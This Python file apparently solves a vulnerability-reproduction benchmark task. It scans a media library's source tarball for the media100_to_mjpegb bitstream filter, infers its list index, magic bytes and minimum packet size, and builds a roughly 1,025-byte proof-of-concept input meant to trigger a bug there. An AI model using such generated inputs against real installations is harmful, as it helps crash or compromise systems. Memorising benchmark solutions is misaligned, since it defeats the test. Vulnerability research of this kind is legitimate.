import os
import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        index = 0
        magic = b"MJPB"
        min_payload_size = 1024

        bsf_list_text = None
        filter_text = None
        config_text = None

        try:
            with tarfile.open(src_path, "r:*") as tar:
                # Find relevant files in the tarball
                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    base = os.path.basename(member.name)
                    if base == "bsf_list.c" and bsf_list_text is None:
                        f = tar.extractfile(member)
                        if f is not None:
                            bsf_list_text = f.read().decode("utf-8", errors="ignore")
                    if "media100_to_mjpegb" in base and base.endswith(
                        (".c", ".cc", ".cpp", ".cxx")
                    ):
                        if filter_text is None:
                            f = tar.extractfile(member)
                            if f is not None:
                                filter_text = f.read().decode("utf-8", errors="ignore")
                    if base in ("config_components.h", "config.h", "config.mak") and config_text is None:
                        f = tar.extractfile(member)
                        if f is not None:
                            config_text = f.read().decode("utf-8", errors="ignore")
        except Exception:
            # If anything goes wrong while reading the tarball, fall back to defaults
            pass

        enabled_macros = None
        if config_text is not None:
            enabled_macros = self._parse_enabled_bsf_macros(config_text)

        if bsf_list_text is not None:
            idx = self._get_bsf_index_from_list(bsf_list_text, enabled_macros)
            if idx is not None:
                index = idx

        if filter_text is not None:
            inferred_magic = self._infer_magic_bytes(filter_text)
            if inferred_magic:
                magic = inferred_magic
            inferred_min_size = self._infer_min_size(filter_text)
            if inferred_min_size is not None:
                # Add some slack above the strict minimum
                min_payload_size = max(min_payload_size, inferred_min_size + 16)

        # Target total size close to ground-truth PoC length
        target_total_size = 1025
        payload_size = max(min_payload_size, target_total_size - 1)

        # Keep size within a reasonable upper bound to avoid huge allocations
        if payload_size < 16:
            payload_size = 16
        if payload_size > 4095:
            payload_size = 4095

        payload = bytearray(payload_size)

        # Fill the first 64 bytes (or less) with repeated magic pattern
        if not magic:
            magic = b"MJPB"
        pat_len = max(1, len(magic))
        header_region = min(len(payload), 64)
        for i in range(0, header_region, pat_len):
            end = min(i + pat_len, header_region)
            payload[i:end] = magic[: end - i]

        # Fill the rest with deterministic pseudo-random data
        for i in range(len(payload)):
            if payload[i] == 0:
                payload[i] = (i * 137 + 31) & 0xFF

        poc = bytes([(index & 0xFF)]) + bytes(payload)
        return poc

    def _parse_enabled_bsf_macros(self, config_text: str):
        enabled = set()
        # Header-style: #define CONFIG_FOO_BSF 1
        header_pattern = re.compile(r"#define\s+(CONFIG_[A-Z0-9_]+_BSF)\s+1")
        for m in header_pattern.finditer(config_text):
            enabled.add(m.group(1))

        # Make-style: CONFIG_FOO_BSF=yes
        mak_pattern = re.compile(r"(CONFIG_[A-Z0-9_]+_BSF)\s*=\s*yes")
        for m in mak_pattern.finditer(config_text):
            enabled.add(m.group(1))

        if not enabled:
            return None
        return enabled

    def _get_bsf_index_from_list(self, text: str, enabled_macros):
        pattern_register = re.compile(
            r"REGISTER_BSF\s*\(\s*([A-Z0-9_]+)\s*,\s*([A-Za-z0-9_]+)\s*,"
        )

        current_enabled = True
        assume_all_enabled = enabled_macros is None
        idx = 0
        target_idx = None

        lines = text.splitlines()
        for line in lines:
            stripped = line.strip()
            if stripped.startswith("#if"):
                m = re.search(r"(CONFIG_[A-Z0-9_]+_BSF)", stripped)
                if m:
                    macro = m.group(1)
                    if assume_all_enabled:
                        current_enabled = True
                    else:
                        current_enabled = macro in enabled_macros
                continue
            if stripped.startswith("#else"):
                if not assume_all_enabled:
                    current_enabled = not current_enabled
                continue
            if stripped.startswith("#endif"):
                current_enabled = True
                continue

            m = pattern_register.search(stripped)
            if not m:
                continue

            if not assume_all_enabled and not current_enabled:
                continue

            name = m.group(2)
            if name == "media100_to_mjpegb":
                target_idx = idx
                break
            idx += 1

        return target_idx

    def _infer_magic_bytes(self, text: str) -> bytes:
        # Prefer patterns like 'm','j','p','b' etc.
        char_pattern = re.compile(
            r"'(.)'\s*,\s*'(.)'\s*,\s*'(.)'\s*,\s*'(.)'"
        )
        best = None
        for m in char_pattern.finditer(text):
            token = "".join(m.groups())
            if all(32 <= ord(c) < 127 for c in token):
                lowered = token.lower()
                if any(x in lowered for x in ("mjpb", "mjpg", "jpeg", "jpg ", "m100")):
                    best = token.encode("ascii", errors="ignore")
                    break

        if best:
            return best

        # Fallback: look for 4-char string literals containing mjp*/jpeg
        str_pattern = re.compile(r'"([^"\n]{4})"')
        for m in str_pattern.finditer(text):
            token = m.group(1)
            lowered = token.lower()
            if any(x in lowered for x in ("mjpb", "mjpg", "jpeg")):
                return token.encode("ascii", errors="ignore")

        # Ultimate fallback
        return b"MJPB"

    def _infer_min_size(self, text: str):
        # Look for simple comparisons: something->size < N or <= N
        size_pattern = re.compile(r"->size\s*<\s*=?\s*(\d+)")
        max_size = None
        for m in size_pattern.finditer(text):
            try:
                val = int(m.group(1))
            except ValueError:
                continue
            if max_size is None or val > max_size:
                max_size = val
        return max_size
